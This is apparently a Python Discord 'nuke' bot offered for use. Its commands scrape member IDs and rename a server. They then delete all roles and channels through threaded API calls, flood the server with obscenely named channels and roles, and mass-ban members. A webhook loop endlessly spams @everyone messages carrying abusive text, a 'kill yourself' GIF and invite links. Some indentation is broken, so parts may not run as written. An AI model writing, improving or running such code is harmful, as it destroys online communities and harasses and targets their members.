import discord 
from discord.ext import commands
import os
import random
import asyncio
import threading
import requests

token = input(f"Token: ")

client = commands.Bot(command_prefix=".", intents=discord.Intents.all())

sessions = requests.Session()

headers = {
	  "Authorization": f"Bot {token}"
}

channel_name = ["fucked-by-IOdine", "trashed", "get ran kids", "get-fucked-12-year-olds"]
server_name = "Trashed By IOdine"
role_name = ["fucked-by-IOdine", "trashed", "get ran kids", "get-fucked-12-year-olds"]
message_content = ["@everyone get fucked kids https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831 https://discord.gg/io", "@everyone IOdine was here https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831 https://discord.gg/IO", "@everyone https://tenor.com/view/love-is-war-kiss-kaguya-kaguya-sama-me-and-youre-mother-gif-26386524 https://discord.gg/IO", "@everyone https://tenor.com/view/bill-nye-consider-the-following-kill-yourself-gif-24441260 https://discord.gg/IO"]


@client.event
async def on_connect():
  print("Connected to", client.user)

@client.command()
async def scrape(ctx):
  await ctx.message.delete()
  chunk = await ctx.guild.chunk()
  try:
    os.remove("Scraped/members.txt")
  except:
    pass

  with open('Scraped/members.txt', 'a') as m:
    for member in chunk:
      m.write(str(member.id) + "\n")
    m.close()


@client.command()
async def nn(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id
  await ctx.guild.edit(name=server_name)
  
  def delete_role(i):
    sessions.delete(
      f"https://discord.com/api/v10/guilds/{guild}/roles/{i}",
      headers=headers
    )
    
  def delete_channel(i):
    sessions.delete(
      f"https://discord.com/api/v9/channels/{i}",
      headers=headers
    )

  def create_channels(i):
    json = {
      "name": i
		}
    sessions.post(
		  f"https://discord.com/api/v10/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

  def create_roles(i):
		json = {
		  "name": i
		}
		sessions.post(
		  f"https://discord.com/api/v10/guilds/{guild}/roles",
		  headers=headers,
		  json=json
		)

  for i in range(5):
	  for role in list(ctx.guild.roles):
		  threading.Thread(
			  target=delete_role, 
				args=(role.id, )
				).start()
  else:
    pass

  for i in range(5):
    for channel in list(ctx.guild.channels):
      threading.Thread(
        target=delete_channel,
        args=(channel.id, )
        ).start()
  else:
    pass

  for i in range(100):
    threading.Thread(
		  target=create_channels,
      args=(random.choice(channel_name), )
      ).start()
  else:
    pass

  await asyncio.sleep(15)

  for i in range(100):
    threading.Thread(
		  target=create_roles,
			args=(random.choice(role_name), )
			).start()
  else:
    pass

  
			
  
  
    
  
@client.command()
async def mb(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id
  users = open("Scraped/members.txt")
  def mass_ban(x):
    sessions.put(f"https://discord.com/api/v10/guilds/{guild}/bans/{x}", headers=headers)
    
    try:
      for x in users:
        threading.Thread(target=mass_ban, args=(x, )).start()
    except Exception as e:
      print(e)
      pass


  

@client.event
async def on_guild_channel_create(channel):
  while True:
    try:
      webhook = await channel.create_webhook(name="Wizzed-by-iodine")
      for i in range(100):
        await webhook.send(random.choice(message_content))
      else:
        pass
    except Exception as e:
      print(e)
      pass


client.run(token)
